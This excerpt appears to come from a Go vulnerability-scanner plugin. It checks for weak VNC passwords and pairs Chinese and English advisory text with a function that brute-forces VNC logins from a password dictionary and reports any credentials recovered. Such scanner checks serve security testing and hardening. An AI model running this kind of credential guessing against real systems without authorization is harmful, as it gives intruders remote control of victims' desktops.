...
func init() {
    ...
    "Translation": {
        "CN": {
            "Name": "VNC 远程桌面系统弱口令漏洞",
            "Product": "VNC",
            "Description": "<p>VNC为一种使用RFB协议的屏幕画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的屏幕画面。VNC与操作系统无关，因此可跨平台使用，例如可用Windows连线到某Linux的电脑，反之亦同。甚至在没有安装客户端程序的电脑中，只要有支持JAVA的浏览器，都可以使用。<br></p><p>该产品存在弱口令，攻击者可利用弱口令密码进入系统，查看系统信息，修改系统配置，影响用户使用。</p>",
            "Recommendation": "<p>1、修改口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该服务。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>VNC产品存在弱口令，攻击者可利用弱口令密码进入系统，查看系统信息，修改系统配置，影响用户使用。<br></p>",
            "VulType": [
                "弱口令"
            ],
            "Tags": [
        ...
        "EN": {
            "Name": "VNC remote desktop system week password vulnerability",
            "Product": "VNC",
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			customDictPath := os.Getenv("POC_WEAK_PWD__DICT_PATH")
			var vncBrute jsonvul.ScanStep
			vncBrute.BruteForce.Protocol = "vnc"
			if customDictPath != "" {
				file, err := os.Open(customDictPath)
				if err == nil && file != nil {
					vncBrute.BruteForce.UserPassPairFiles = append(vncBrute.BruteForce.UserPassPairFiles, customDictPath)
					file.Close()
				}
			}
			vncBrute.BruteForce.UserPassPairFiles = append(vncBrute.BruteForce.UserPassPairFiles, "vnc_user_pass.dict")
			bruteResult := vncBrute.BruteForce.BruteCheck(&exp.ScanSteps, u, ss)
			regAccount, _ := regexp.Compile(`vnc://(.*)@`)
			AccountString := regAccount.FindAllStringSubmatch(bruteResult.URL, -1)
			regPassword, _ := regexp.Compile(`vnc://(.*):`)
			password := regPassword.FindAllStringSubmatch(AccountString[0][0], -1)
			ss.VulURL = fmt.Sprintf("vnc://%s@%s", password[0][1], u.HostInfo)
			return bruteResult.Success
		},
		nil,
	))
}
